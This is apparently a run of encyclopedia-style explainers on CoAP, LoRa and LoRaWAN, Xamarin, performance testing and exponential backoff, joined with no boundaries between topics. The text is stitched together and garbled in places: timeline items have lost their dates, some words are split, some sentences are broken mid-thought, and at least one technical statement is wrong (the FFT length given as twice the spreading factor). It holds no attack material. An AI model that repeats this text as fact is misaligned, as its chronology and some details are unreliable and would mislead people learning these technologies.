What 's a typical message flow in CoAP ?
Examples CoAP message flows : ( a ) and ( b ) show messaging ; ( c ) and ( d ) show request / response .
Source : Chen 2014 , fig .
3,4,6,7 .
It may be tempting to think of sensor nodes as CoAP clients , but in fact they are typically CoAP servers .
But they could also be CoAP clients consuming information available on other devices on the network .
In a typical CoAP flow , clients discover resources available on the server by asking for the URI path ` GET /.well - known / core ` .
The server will reply with the content type ` application / link - format ` .
Now that the client knows what resources are available , it can request the content of a specific resource ( such as temperature ) by calling ` GET /temperature ` .
The server will respond with the value of that resource .
CoAP specifies four message types : Confirmable ( CON ) , Non - confirmable ( NON ) , Acknowledgement ( ACK ) , and Reset ( RST ) .
Requests and responses are carried as part of these message types .
If reliable transmission is required , CON and ACK are used with timeout and exponential back - off .
If unreliable transmission is sufficient , then NON is used .
When ACK is used , the response may be piggybacked with ACK or sent separately in a CON .
Where should I use CoAP ?
If you have an existing system that is web service - based , then adding in CoAP is a good option .
It 's good in resource - constrained environments : energy - limited devices , low - bandwidth links , and lossy or congested networks .
On congested networks , CoAP / UDP would work but MQTT / TCP may not even manage a complete handshake .
CoAP can be used where broadcast and multicast is needed .
CoAP is suited for building something where a device is deployed in " report only " mode .
Once deployed , the device simply reports data back to a server .
Information appliances , control equipment and communication equipment in Smart Home networks need to be low cost and lightweight .
Thus , CoAP is suitable for home communication networks .
When deploying on third - party networks where we do n't have control over firewalls and blocked ports , CoAP may not be suitable .
In this case , HTTP / REST is a good option .
Since sensor nodes are CoAP servers , there could be issues with Network Address Translation ( NAT ) .
LWM2 M , which is based on CoAP , overcomes this by requiring clients to send a probe packet first so that the router can make the association .
Although CoAP does not require IPv6 , it 's easiest to deploy on IP networks .
What 's the security protocol used for CoAP ?
CoAP uses Datagram Transport Layer Security ( DTLS ) for security .
The DTLS - secured CoAP protocol is termed CoAPs .
DTLS is based on PSK , RPK and certificate security .
There are three main elements when considering security , namely integrity , authentication and confidentiality .
DTLS can achieve all of them .
DTLS solves two problems : reordering and packet loss .
It adds three implements : Packet retransmission Assigning sequence number within the handshake Replay detection Unlike network layer security protocols , DTLS in the application layer protects end - to - end communication .
No end - to - end communication protection will make it easy for attackers to access all text data that passes through a compromised node .
DTLS also avoids cryptographic overhead problems that occur in lower layer security protocols .
It 's been shown that DTLS adds 11 % overhead compared to communication without any security .
Moreover , since DTLS is error tolerant , it 's more vulnerable to being hacked compared to using TLS .
What are the alternatives to CoAP for IoT messaging ?
A comparison of many IoT messaging protocols .
Source : ADLINK 2015 .
Among the alternatives to CoAP are Data Distribution Service ( DDS ) , Advanced Message Queuing Protocol ( AMQP ) , MQTT , HTTP / REST , and eXtensible Messaging and Presence Protocol ( XMPP ) .
DDS is from Object Management Group .
AMQP and MQTT are OASIS standards .
XMPP is defined by IETF .
The DDS offers a rich set of QoS and can prioritize traffic based on content .
It can use either TCP or UDP .
Its model is also flexible : publish - subscribe ( like MQTT ) or request - response ( like CoAP ) .
A study comparing these protocols concluded that MQTT and RESTful HTTP are popular , possibly because they are stable and mature .
MQTT is suitable for constrained devices and RESTful HTTP can fit into fog and cloud computing systems .
CoAP is also gaining maturity .
In terms of performance , how does CoAP compare against its alternatives ?
A survey that studied the performance of different messaging protocols concluded that CoAP and MQTT show the best latency performance .
CoAP performs better with high packet losses .
CoAP messages can be transferred three times faster than HTTP messages .
However , when comparing HTTP/2 with CoAP , HTTP/2 performed better in high congestion scenarios .
CoAP requires less bandwidth compared to MQTT .
In a network under heavy load , CoAP used less bandwidth than MQTT whereas DDS took up twice the bandwidth of MQTT .
CoAP also had higher efficiency , calculated as a ratio of useful information bytes to total bytes at application and transport layers .
In terms of energy consumption , both MQTT and CoAP are efficient .
We should note that MQTT is based on TCP .
There 's also a variant of MQTT called MQTT - SN that runs on UDP .
Comparing CoAP against MQTT - SN may be more appropriate .
Likewise , CoAP running on top of TCP ( RFC 8323 ) can be compared against MQTT .
Could you compare some implementations of CoAP ?
Summary of CoAP implementations .
Source : Iglesias - Urkia et al .
2017 , table 1 .
There are plenty of open source implementations of CoAP .
In Java , we have Californium and jCoAP .
In C we have Erbium , libCoAP , and OpenCoAP .
Some OS support CoAP : mbed , TinyOS and Contiki .
When looking at implementations , we need to consider if it 's for client or server ; for constrained devices or server side ; for browsers ; or for smartphones .
Carsten Bormann maintains a rich list of CoAP implementations .
A similar list is available on Wikipedia .
A comparison of some implementations in C , Java , JavaScript and Python has looked at feature support , targeted platforms and developer usability .
It found that CoAPy did not interoperate with any other implementation .
On the server side , c implementations ( libcoap , smcp and microcoap ) are fast .
It also compared CPU and memory usage .
For example , sharedlib / client / server ROMs in bytes are 296K/33K/22 K for libcoap and 383K/23K/18 K for smcp .
Peak RAM usage for C implementations is typically 3.2 KB .
What are CoAP standards that developers must read ?
Among the standards relevant to CoAP are the following : RFC 7252 : This is the main CoAP standard .
RFC 7959 : CoAP is for transferring small payloads , but if firmware upgrades are needed , the block - wise transfer option becomes useful .
Information blocks are sent without maintaining any state .
RFC 7641 : What if we want to get notified when the resource state changes on the CoAP server ?
This will save clients from polling the server on a regular basis .
Observing resources is an option that makes this possible .
RFC 8323 : CoAP over UDP supports reliable delivery , simple congestion control and flow control .
What if we want reliable transport ?
This RFC talks about CoAP over TCP , TLS and WebSockets .
RFC 6690 : Defines a simple format for exposing resources as a basis for a resource directory .
RFC 7390 : Using the multicast feature of CoAP , this RFC details how to use CoAP for group communication .
The latest developments of the CoRE Working Group are on the IETF website .
CoRE parameters , including CoAP method and response codes , are registered with IANA .
IANA has assigned port numbers 5683 and 5684 for CoAP and CoAPs .
What are some useful resources for CoAP developers ?
For interoperability testing , coap.me is useful .
Wireshark v1.12 has support to decode CoAP packets .
To translate CoAP to HTTP and vice versa , such as done on a proxy , crosscoap can be used .
There 's also a handy CoAP cheatsheet .
The Internet Engineering Task Force ( IETF ) standardizes the Constrained Application Protocol ( CoAP ) as RFC 7252 .
OASIS approved MQTT Version 3.1.1 as an OASIS Standard .
The Internet Engineering Steering Group ( IESG ) approves HTTP/2 as a proposed standard .
Using CoAP as the underlying stack , the Lightweight Machine to Machine ( LWM2 M ) technical standard is approved by Open Mobile Alliance .
LWM2 M defines interfaces Bootstrap , Client Registration , Device management and service enablement , and Information Reporting .
It gives details on resource identifiers , security procedures , and transport layer binding and encodings .
IETF publishes RFC 8323 titled " CoAP ( Constrained Application Protocol ) over TCP , TLS , and WebSockets " as a Proposed Standard .
Use of messaging protocols from an IoT developer survey .
Source : Cabé 2018 , slide 38 .
Eclipse Foundation publishes the results of a survey of IoT developers .
For messaging , more than 60 % of respondents use MQTT .
CoAP is in fifth place with only 20 % of respondents using it .
LoRa logo .
Source : Semtech 2017 .
For the Internet of Things ( IoT ) , many devices are likely to be constrained in terms of cost and power .
For many use cases , devices require only a low data rate but a long range .
Cellular technologies , Wi - Fi or Bluetooth do n't cater well to these use cases .
This is where LoRa ( Long Range ) becomes relevant .
LoRa devices are low power , long - range devices .
They transmit and receive data over unlicensed frequency spectrum .
A typical use case is to transmit low - rate sensor data .
There are plenty of LoRa deployments worldwide , offered as free or paid services .
LoRa is one particular technology in the domain of Low - Power Wide - Area Network ( LPWAN ) .
Alternatives to LoRa include Sigfox and NB - IoT. What led to the wider deployment of LoRa ?
LoRa fits where Wi - Fi , BLE and cellular do n't .
Source : Semtech Corporation 2020c .
Cellular networks such as 2 G and GPRS are used for machine - to - machine ( M2 M ) data communication , particularly for sending data from remote locations .
Such networks use relatively less power compared to 3 G or LTE .
But by the start of 2017 , network operators such as AT&T ( US ) announced the termination of 2 G and GPRS .
3GPP 's own alternatives for M2 M communications were LTE - M and NB - IoT. However , these were not expected to be ready until early or mid-2018 .
This created a void following the sunsetting of 2G. There was a need for a protocol that catered to low power , long - range and bi - directional communication devices .
This led to the wider deployment of the LoRa network .
LoRa does n't need costly spectrum licensing fees typical of cellular networks .
By 2013 , the fundamental technologies powering LoRa were patented and owned by Semtech .
The LoRa Alliance was formed in early 2015 to address the market need , while also standardizing and promoting LoRaWAN that was built on top of LoRa .
What are the advantages of LoRa ?
LoRa has the following advantages : long range : many miles on line - of - sight links .
Low power : Can run on battery for years .
Low cost : LoRa modules are pocket - friendly .
It uses constant envelope modulation that brings lower cost and higher efficiency to the power amplifier .
Universal : Uses unlicensed bands that are globally available .
Bi - directional : Can send and receive data .
Network scalability : Easy to scale as it supports millions of messages per station .
A single gateway can support thousands of end devices .
Easy commissioning : Easy to deploy on an existing network .
What are the typical use cases of LoRa ?
Smart street lights with LoRa .
Source : inteliLIGHT 2020 .
LoRa is suitable for rural use due to its long range .
In urban areas , where signals have to penetrate on floors and walls , LoRa is suitable .
Among its application areas are smart cities , smart homes and buildings , smart agriculture , smart metering , and smart supply chain and logistics .
A typical use case is smart metering .
For example , LoRa - enabled meters will increase efficiency and optimize processes .
For water management , sensors will monitor water pressure , water level or detect leaks .
In smart buildings , the typical use of LoRa is for smoke detection , asset and vehicle tracking , room usage and more .
Asset tracking is possible because LoRa works well even when devices are in motion .
Since LoRa is bidirectional , applications can benefit from command - and - control functionality .
Uplink can be used for continuous monitoring and downlink can be used for controlling the device .
LoRa when combined with Wi - Fi , can optimize a number of IoT use cases .
For example , asset tracking , location services and on - demand streaming can be improved .
Could you share some technical details of LoRa ?
Key technical parameters of LoRa .
Source : Semtech Corporation 2020 .
LoRa operates in different bands in different parts of the world .
In the USA , it operates at 902 - 928 MHz .
In Europe , it operates at 863 - 870 MHz .
In China , the spectrum is 470 - 510 MHz and 779 - 787 MHz .
In India , it operates on 3 channels : 865.0625 MHz , 865.4025 MHz , 865.9850 MHz .
In many Asian countries , the spectrum is 920 - 923 MHz or 923 - 925 MHz .
Australia uses 915 - 928 MHz .
Typically , downlink channels are higher than uplink .
Data is spread with a chip sequence , thus spreading signal energy over a wider bandwidth .
LoRa has six spreading factors , SF7-SF12 .
The larger the spread , the longer the range and smaller the bit rate .
Spreading factors are orthogonal , which means that signals with different spreading factors can coexist .
In North America , there are 64 125 kHz uplink channels , 8 500 kHz uplink channels , and 8 500 kHz downlink channels .
For the same SF , lower bandwidth implies better sensitivity .
Semtech 's SX1276/77/78/79 transceivers achieve 168 dB maximum link budget .
Sensitivity is -148 dBm .
The Bit rate can be programmed to up to 300 kbps .
They receive current of 9.9 mA and 200 nA for register retention .
What is the range of LoRa ?
LoRa has been shown to work at a range of 702 km .
Source : Telkamp and Slats 2017 .
LoRa has a typical range of 2 - 8 km with the higher range achieved when the spreading factor ( SF ) is larger .
A larger spreading factor also implies a lower bit rate .
Moreover , this range can also vary based on the terrain .
In an urban environment with an outdoor gateway , 2 - 3 km is the typical range .
In rural areas , this can be 5 - 7 km .
In an experiment using a weather balloon , a range of 702 km was achieved .
A LoRa device was attached to a helium - filled balloon that rose to an altitude of 38.772 km .
Packet sent from the node were received by 148 different gateways connected to The Things Network .
One of the gateways at a height of 30 meters was located in Wrocław , Poland .
By that time , the balloon was flying over Osterwald , Germany .
The distance was 702.676 km .
Transmit power was 25mW ( 14dBm ) , which is about 40 times smaller than what a mobile phone uses .
Could you share some details about how LoRa works ?
Demodulating a LoRa signal .
Source : Knight 2016 , slide 46 .
LoRa uses Chirp Spread Spectrum ( CSS ) that spreads the original signal to a larger bandwidth by continuously varying the frequency .
Data signals are spread or chipped to a higher rate .
This then modulates the chirp carrier signal .
Due to this method , LoRa does n't require a highly accurate reference clock , thus dropping the cost of receiver design .
The signal also tolerates Doppler frequency shifts , making LoRa suitable for mobile devices .
Due to spreading , processing gain is achieved , making LoRa resilient to multipath and fading .
A LoRa PHY frame has repeated upchirps for the preamble , two downchirps for the start of frame delimiter ( SFD ) , and choppy upchirps of varying lengths that signify data .
Instantaneous frequency changes are due to data being modulated on the chirps .
A LoRa receiver will identify the preamble and SFD .
To extract symbols , it will de - chirp with locally generated signal and take FFT of de - chirped signals .
FFT length corresponds to the number of possible symbols , which is twice the spreading factor .
How is LoRa different from LoRaWAN ?
LoRa fits in the PHY layer .
Source : Semtech Corporation 2020 , fig .
7 .
LoRa is proprietary and patented by Semtech Corporation .
LoRaWAN is built on top of LoRa and is standardized by the LoRa Alliance .
LoRa defines the PHY layer for low - cost , low - power , and long - range communication .
LoRaWAN defines the MAC layer for bidirectional communication , mobility and localization services .
LoRaWAN addresses network architecture : how devices connect to gateways , how gateways process packets , and how packets make their way to network servers and application servers .
LoRaWAN also defines three different device types ( class A / B / C ) to suit different power needs .
While it 's typical to use LoRaWAN with LoRa , there are alternatives to LoRaWAN .
For example , Link Labs ' Symphony Link is an alternative .
They claim that LoRaWAN is suitable for public networks , but for private networks serving industrial applications , Symphony Link is better .
Where has LoRa been deployed ?
LoRaWAN global network coverage .
Source : Anciaux 2018 .
LoRa is widely deployed in Europe , the US and Asia .
By mid-2018 , LoRaWAN was deployed in 95 countries .
Back in 2015 , National Narrowband Network and Telstra did independent LoRa trials in Australia .
In November 2015 , KPN 's LoRa network went live in Rotterdam and The Hague in the Netherlands .
In July 2016 , it achieved nationwide coverage , making the Netherlands the first country in the world to have this capability .
In the US , MachineQ , a Comcast company , is providing a LoRaWAN - based access network for IoT applications .
In May 2018 , it connected 10 US cities to the network .
In June 2019 , Kerlink and Tata Communications Transformation Services announced a partnership to deploy LoRaWAN globally .
In fact , they have already deployed LoRaWAN in 40 Indian communities and cities .
The network was reliable across three monsoon seasons .
In December 2019 , SenRa announced LoRaWAN coverage in 60 Indian cities and plans to expand to 100 cities by the end of 2020 .
Taiwanese company Kiwi Technologies has enabled LoRaWAN deployments in China , Taiwan , Indonesia , Thailand , and other countries .
Who supplies LoRa chipsets and modules ?
LoRa evaluation kit from Microchip .
Source : Microchip 2020 .
The first LoRa commercial chipsets were manufactured by Semtech .
These are SX12XX series chips .
Now there are many semiconductor companies such as Microchip and Murata who are manufacturing chips compatible with their microcontrollers .
As an example , Murata 's CMWX1ZZABZ LoRa module integrates Semtech 's SX1276 transceiver with STM32L0 Series MCU from STMicroelectronics .
ST 's LoRaWAN SDK can be used to program the MCU .
LoRa Alliance maintains a list of products that are certified for LoRaWAN .
These products include system - in - packages , sensors , and modules .
What are some useful resources to learn about or use LoRa ?
LoRa Alliance 's Resource Hub is the place to download the LoRaWAN specification .
There are also case studies , FAQ , presentations and white papers .
The LoRa Developer Portal from Semtech is a useful site to visit .
It has useful case studies , technical documents , datasheets , user guides , and more .
Bastille Research has open sourced gr - lora that 's a GNU Radio out - of - tree ( OOT ) module implementing LoRa PHY .
Although LoRa is proprietary , Matt Knight did blind signal analysis that led to gr - lora .
There are many tools available online for operating LoRa - based networks .
LoRatools provides tools such as key generator , Thingpark import helper , Hex helper and airtime calculator .
For data visualisation , open source visualisers such as Kibana can be used .
What are some criticisms of LoRa ?
LoRa is not open source .
The technology is patented by Semtech Corporation , who release the chipsets .
Although the patents describe how LoRa works , independent analysis has shown that real - world implementation differs in many ways from what 's disclosed in the patents .
In particular , symbol gray indexing , data whitening and interleaving differ .
The security of LoRa at PHY layer is probably not mature .
It 's possible to inject and mask malicious traffic that higher layers do n't detect .
Many of the exploits known to IEEE 802.15.4 can be used here .
Accurate LoRa localization is hard to implement , at least with the time difference of arrival ( TDOA ) .
Unless there 's near line - of - sight , it 's hard to detect the direct path .
Since LoRa bandwidth is only 125 kHz , a receiver can separate different multipaths only if they differ by at least 2.4 km .
It may be said that compared to NB - IoT , LoRa has a lower data rate and higher latency .
However , LoRa also gives longer battery life than NB - IoT. Therefore , this is more of a trade - off that may benefit many IoT applications .
There are also limitations to LoRaWAN that are not discussed here .
Could you name some alternatives to LoRa ?
Comparing many LPWANs .
Source : Oviphone Europe 2020 .
LoRa has the following alternatives : Sigfox : Proprietary technology from a French company .
low cost and long range .
meant mainly for uplink .
Downlink is limited .
There are many deployments in Europe but only a few in the U.S. An indoor tracker with Sigfox can last for 5 + years on a single AA cell .
Narrowband IoT ( NB - IoT ) : Cellular - based technology optimised for low power and long range .
Compared to LoRa , NB - IoT has the advantage of being an open standard in an already mature ecosystem for mobile networks with support from telecom equipment vendors .
It operates on licensed spectrum .
Related cellular standards for LPWAN include EC - GSM - IoT and LTE Cat - M1 .
Random Phase Multiple Access ( RPMA ) : Proprietary technology developed by Ingenu , previously called On - Ramp Wireless .
Superior uplink and downlink capacity .
Better link budget than LoRa or Sigfox .
It operates at 2.4 GHz .
Weightless : Open standard in sub - GHz unlicensed spectrum .
Three variants : Weightless - W , Weightless - N and Weightless - P. Guglielmo Marconi experiments with frequency - selective reception in an attempt to reduce interference .
Actress Hedy Lamarr and composer George Antheil are awarded U.S. Patent 2292387 for frequency hopping .
Their patent application is titled Secret Communications System .
During World War II , the U.S. military used frequency hopping methods .
Years later , this technology has become important for commercial wireless communication .
Waveforms pertaining to the chirp generation .
Source : Hornbuckle 2008 , fig .
5 .
The first patent for LoRa was filed by French company Cycleo SAS .
This uses a technology called Chirp Modulation .
The U.S. Patent US7791415 is titled Fractional - N Synthesized Chirp Generator .
The figure shows an example where the down - chirp rate is twice the up - chirp rate .
The output frequency \(f_o(t)\ ) is determined by the frequency ramp control word \(R(t)\ ) and frequency control word \(M(t)\ ) .
Semtech acquired Cycleo SAS for $ 5M. Semtech is a company involved in the manufacturing of analog and mixed signal semiconductors for various industries .
Typical structure of a LoRa data frame .
Source : Seller and Sornin 2013 , fig .
4 .
The second patent for LoRa was filed by Semtech .
Patent EP2763321 titled Low power long range transmitter describes the use of chirp modulation to transmit low - power signals over long distances .
A typical data frame has preamble and data .
Preamble has unmodulated chirps ( 411 ) , symbols for frame synchronization ( 412 ) , symbols for frequency synchronization ( 413 ) , silence ( 420 ) and further unmodulated symbols ( 414 ) .
Data has header ( 415 ) and payload ( 416 ) .
LoRa Alliance releases version 1.0 of LoRaWAN ™ Specification .
The authors are from Semtech , IBM and Actility .
Version 1.1 of the specification comes out in October 2017 .
LoRa Alliance became formally operational .
Its mandate is to standardize LPWAN around LoRaWAN specifications , and oversee a certification and compliance program for better interoperability .
By mid-2020 , the alliance will have more than 500 members .
These include technology leaders ( IBM , Cisco , HP , Foxconn , Semtech , Sagemcom ) , product companies ( Schneider , Bosch , Diehl , Mueller ) , SMEs and startups .
The Netherlands became the first country in the world to have nationwide LoRaWAN coverage .
Google Cloud joins the LoRa Alliance .
Given the recent growth of LoRa and LoRaWAN , Google Cloud hopes to " simplify the process of developing , deploying , and managing IoT solutions " .
Semtech Corporation demonstrates LoRa technology at Mobile World Congress Shanghai .
It claims that LoRa deployments have reduced water leaks by 25 % in commercial buildings , reduced energy costs by 30 % in smart homes , and saved 20 % of costs on gas metering .
Xamarin is a cross - platform application development framework .
It allows you to develop a mobile app using C # and reuse most of the codebase across multiple platforms , including Android , iOS and Windows .
Among the advantages of Xamarin are native user interfaces , native API access , native performance and developer productivity .
Xamarin itself leverages .NET development platform that comes with C # language , its compilers , base libraries , editors and tools .
Xamarin extends .NET so that developers can build mobile apps and target multiple platforms .
When should I use Xamarin ?
There are many hybrid and cross - platform frameworks to develop apps across multiple platforms , but these require skills in JavaScript and are best suited for Web developers .
For them , Apache Cordova is one possible framework , but do keep in mind that this is a hybrid approach that will not give native performance .
Where performance is desired along with faster time to market via multiple mobile platforms , Xamarin must be preferred .
Xamarin is best suited for developers coming from .NET , C # or Java backgrounds .
As a note , Xamarin should not be confused with .NET Core , though both are cross platform and open source .
Xamarin is for cross - platform mobile ( though it can be used for MacOS ) whereas .NET Core is for creating cross - platform web apps , microservices , libraries and console apps that can run on Windows , Linus or MacOS .
Why should I use Xamarin ?
App logic is shared across platforms .
Source : de la Torre 2016 .
Xamarin helps to expedite native mobile app development targeting multiple platforms .
It 's been said that for informational apps , 85 % of code can be reused across Android and iOS .
For more intensive apps , code reuse of 50 % is possible .
This code reuse comes from using shared C # app logic across platforms .
The User interface code itself is not shared by Xamarin , but that 's where Xamarin is .
Forms come in .
Using Xamarin .
96 % code reuse has been reported .
For developers , this means that you get to build native Android , iOS and Windows Phone apps concurrently without having to build them one after another or having multiple teams with multiple skillsets and tools .
Xamarin .
Android and Xamarin.iOS provide further customization possibilities for developers who are looking at tweaking the app 's look and feel achieved with Xamarin .
Forms .
There are several other benefits , like seamless API integration , easy collaboration and sharing , etc .
Could you describe some useful Xamarin - specific terms that developers should know ?
AOT compilation used in Xamarin.iOS .
Source : Microsoft Docs 2017b .
The term managed code refers to code that 's managed by .NET Framework Common Language Runtime .
In the case of Xamarin , this is the Mono Runtime .
In contrast , native code is code that runs natively on the platform .
The managed code could be C # or F # .
Java / Android code is native to Android ; or Objective - C code is native to iOS / MAC .
During compilation , C # or F # code is converted to Microsoft Intermediate Language ( MSIL ) .
On Android and Mac platforms , MSIL is compiled to a native runtime using just - in - time ( JIT ) compilation .
On iOS , due to security restrictions , this is not allowed .
Hence , ahead - of - time ( AOT ) compilation is performed .
What 's the architecture of Xamarin ?
Architecture of Xamarin .
Android .
Source : Microsoft Docs 2018a .
Architecture is described in the documentation in three places : Xamarin .
Android Architecture Xamarin .
Mac Architecture Xamarin.iOS Architecture In general , C # code and .NET APIs sit on top of the Mono runtime , which in turn sits on top of the OS kernel .
Architecture allows for managed code to invoke native APIs via bindings .
In Android , Managed Callable Wrappers ( MCW ) are used when managed code needs to invoke Android code ; Android Callable Wrappers ( ACW ) are used when Android runtime needs to invoke managed code .
There 's also the Java Native Interface ( JNI ) for one - off use of unbound Java types and members .
How much does it cost to use Xamarin ?
Xamarin was initially available for a license .
After it was acquired by Microsoft in 2016 , it 's now bundled with the Visual Studio suite of tools for free .
While Visual Studio is not completely free , there is a Community Edition , which is free for eligible companies and developers .
The .NET platform itself is open source and Xamarin is part of it .
This means there are no fees or licensing costs , even for commercial use .
What are the pre - requisites for Xamarin app development ?
To develop the app , one should have good programming expertise in C # , assuming that the RESTful APIs required for the application are already available .
A Windows PC will be required for the development of Android and Windows platforms .
iOS development is done on Windows PC , but to build the app , a Mac will be required to be connected to the same network as per Apple 's requirements .
How does Xamarin compare against other cross - platform frameworks ?
Among the cross - platform mobile frameworks are React Native , Ionic 2 , Flutter , NativeScript , and Xamarin .
Ionic 2 , React Native and NativeScript rely on web technologies ( HTML / CSS / JavaScript / TypeScript ) .
Ionic 2 can suffer from performance problems .
While Ionic 2 uses WebView ( basically HTML wrapped in a native app ) , React Native and NativeScript use native UI components .
Ionic 2 can also allow access to native API but will require the use of Apache Cordova .
Xamarin uses native UI components and offers good performance .
For development , Xamarin lacks automatic restarting and hot / cold swapping .
In this aspect , React Native is one of the easiest for developer productivity .
All frameworks allow native code bindings , but this process is easiest on Xamarin .
Xamarin offers full one - to - one bindings to native libraries , whereas in React Native or Ionic , support is partial and done via an abstraction layer .
A blog post from AltexSoft compares the performance of Xamarin apps against native apps .
It concludes that performance drop due to Xamarin is acceptable in most cases , but the use of Xamarin .
Forms are not recommended when apps are CPU intensive .
What are some criticisms of Xamarin ?
It 's been said that Xamarin support for the latest platform updates ( iOS / Android ) is usually delayed .
While iOS and Android developers can tap into an active ecosystem plus use open source technologies , a similar following is limited to Xamarin .
Xamarin is also not suited for apps that are heavy on graphics , where code reuse will be limited .
For that matter , Xamarin developers still need to learn platform - specific languages for the UI , unless they also adopt Xamarin .
Forms for their apps .
Xamarin apps are also larger in size when compared to equivalent native apps .
This is because the app has to include the Mono runtime and associated components .
A simple " hello world " Android app written in Xamarin requires about 16 MB .
Where can I learn more about Xamarin ?
Xamarin has excellent documentation and code samples on their website .
Specific official resources from Microsoft include : Documentation Courses , tutorials and videos Community forums The Xamarin Show on MSDN Xamarin tutorials on Microsoft Learn Visual Studio tools for Xamarin There used to be Xamarin University to train and certify professional developers .
From June 2019 , this is now part of the Microsoft Learn platform .
Miguel de Icaza and Nat Friedman started Helix Code for GNOME desktop application development for the Linux platform .
In 2001 , it was renamed Ximian , which was acquired in 2003 by Novell .
Microsoft released .NET Framework and Visual Studio .NET along with introducing a new language named C # .
The Mono project has been launched to support .NET applications on non - Windows platforms .
Open source and based on the .NET Framework , Mono enables developers to build cross - platform applications .
Xamarin as a company is incorporated with the idea of building commercial .NET offerings for iOS and Android .
In July , Novell gave Xamarin the rights to use MonoTouch and Mono for Android .
Microsoft acquires Xamarin and releases Xamarin as part of the Visual Studio suite of tools .
Performance testing helps identify bottlenecks in a system , establish a baseline for future testing , support a performance tuning effort , and determine compliance with performance goals and requirements .
Performance testing is an ongoing task throughout the life cycle of the project .
It not only involves testers , but also developers and operations to run and maintain the application to its performance expectations .
Performance , load , and stress tests are subcategories of performance testing , each intended for a different purpose .
What is performance testing in software ?
Performance testing is a type of non - functional testing .
It 's intended to determine the responsiveness , throughput , reliability , and/or scalability of a system under a given workload .
Performance testing is testing that is performed to determine how fast some aspect of a system performs under a particular workload .
It can serve different purposes , such as to demonstrate that the system meets performance criteria .
In the past , performance testing was a specialized activity managed by separate teams , not the developers .
The process typically takes weeks and even months .
With the transition to Agile and DevOps , this has changed .
Using open source and commercial tools , it 's now become possible to do performance testing by developers on shorter time scales .
What should be the focus of performance testing ?
Following are some focus areas for performance testing : Speed : Determines whether the software application responds quickly .
Scalability : Determines the maximum user load the software application can handle .
Stability : Determines if the application is stable under varying loads .
What are the common goals of performance testing ?
Performance testing has the following goals : Assess production readiness Evaluate against performance criteria Compare performance characteristics of multiple systems or system configurations Find the source of performance problems Support system tuning Find throughput levels What are the types of performance testing ?
Types of software performance testing .
Source : Devopedia .
Each type of performance testing has a specific focus as noted below : Load Testing : Checks the application 's ability to perform under anticipated user loads .
The objective is to identify performance bottlenecks before the software application goes live .
Stress Testing : Also called Breakpoint Testing , this involves testing an application under extreme workloads to see how it handles high traffic or data processing .
The objective is to identify the breaking point of an application .
Endurance Testing : Also called Soak Testing , this is done to make sure the software can handle the expected load over a long period of time .
Spike Testing : Tests the software 's reaction to sudden large spikes in the load generated by users .
Volume Testing : A large amount of data is populated in a database and the overall software system 's behavior is monitored .
The objective is to check a software application 's performance under varying database volumes .
Scalability Testing : Determine the software application 's effectiveness in " scaling up " to support an increase in user load .
It helps plan capacity additions to your software system .
What are the steps of performance testing ?
Steps of Performance Testing .
Source : Odom 2014 , Steps of Performance Testing .
We may list the following steps : Identify the Test Environment : Identify the physical test environment and the production environment , which includes the hardware , software , and network configurations .
Identify Performance Acceptance Criteria : Identify the response time , throughput , and resource utilization goals and constraints .
In general , response time is a user concern , throughput is a business concern , and resource utilization is a system concern .
Plan and Design Tests : Identify key scenarios , determine variability among representative users such as unique login credentials and search terms .
Configure the Test Environment : Prepare the test environment , tools , and resources necessary to execute each strategy as features and components become available for test .
Implement the Test Design : Develop the performance tests in accordance with the test design best practice .
Execute the Test : Run and monitor your tests .
Validate the tests , test data , and results collection .
Analyze Results , Report , and Retest : Consolidate and share results data .
Analyze the data both individually and as a cross - functional team .
Re - prioritize the remaining tests and re - execute them as needed .
What performance parameters are monitored during performance testing ?
The following are commonly monitored : Processor Usage : Amount of time the processor spends executing non - idle threads .
Memory Use : Amount of physical memory available for processes on a computer .
Disk Time : Amount of time the disk is busy executing a read or write request .
Bandwidth : Shows the bits per second used by a network interface .
Private Bytes : Number of bytes a process has allocated that ca n't be shared amongst other processes .
Memory Pages per Second : Number of pages written to or read from the disk in order to resolve hard page faults .
Page Faults per Second : Overall rate at which fault pages are processed by the processor .
Response Time : Time from when a user enters a request until the first character of the response is received .
Throughput : Rate a computer or network receives requests per second .
Maximum Active Sessions : Maximum number of sessions that can be active at once .
Hits per Second : Number of hits on a web server during each second of a load test .
Database Locks : Locking of tables and databases .
Thread Counts : Number of threads that are running and currently active .
Could you give pointers on performance testing in the cloud ?
SmartBear 's LoadComplete enables on - prem plus cloud - based load generation .
Source : SmartBear 2018 .
Cloud - based performance testing refers to the use of cloud technologies to test your application or service .
Your application itself may not be on the cloud , but the load generation , report collection and test monitoring is done on the cloud .
The obvious benefits are lowering infrastructure costs , testing at scale , simulating loads coming from different geographic regions , and more .
This should not be confused with cloud performance testing , where the idea is to validate the performance of an application deployed in the cloud .
The general approach to performance testing , types of tests and parameters monitored remain the same but with some aspects particular to cloud .
For example , storage , processing , bandwidth and the number of users have become important .
In particular , parameters related to management of virtual machines , containers , microservices , database connections , all need to be validated .
Tests should validate how well and fast the cloud infrastructure can adapt to varying loads .
Elasticity , scalability , availability , fault tolerance and reliability are all important measures .
This includes the performance of logging , raising alarms , or sending notifications , across all the cloud services used by the application .
Could you name a few performance testing tools ?
Screenshot of CA BlazeMeter showing a graphical report of load testing .
Source : Karow 2017 .
Some open source tools include Apache JMeter , K6 , LoadUI , and Grinder .
Commercial tools requiring a license include HP LoadRunner , IBM Rational Performance Tester , and Microfocus SilkPerformer .
When selecting a particular tool , you must evaluate the supported features .
One blogger has shared a feature comparison of some tools with respect to scripting , execution and reporting .
Wikipedia gives a useful list of load testing tools .
Mercury Interactive was founded in California .
It releases LoadRunner , one of the first performance testing tools .
JMeter has been released as an open source functional plus performance testing tool .
In November 2011 , it became a top - level Apache project .
OpenSTA has been released as an open source web load and performance testing tool .
Software Test & Performance magazine was launched by BZ Media .
It was later renamed Software Test & Quality Assurance magazine .
A curated list of magazines and blogs for software testing is also available .
Based on JMeter , commercial tool BlazeMeter has been released .
The fourth generation of BlazeMeter be released in 2018 and it enables Continuous Testing .
BlazeMeter enhances JMeter with scalability , reporting , collaboration , and test management features .
Contention Window doubles with every retransmission in BEB .
Source : Yazid et al .
2014 , fig .
2 .
When multiple entities attempt to gain access to a shared resource , only one of them will succeed .
Those who fail wait till the resource becomes available and then retry .
But if everyone were to retry at the same time , quite possibly none of them will succeed .
Moreover , new packets are arriving in addition to those waiting for retries .
Binary Exponential Backoff ( BEB ) is an algorithm to determine how long entities should backoff before they retry .
With every unsuccessful attempt , the maximum backoff interval is doubled .
BEB prevents congestion and reduces the probability of entities requesting access at the same time , thereby improving system efficiency and capacity utilization .
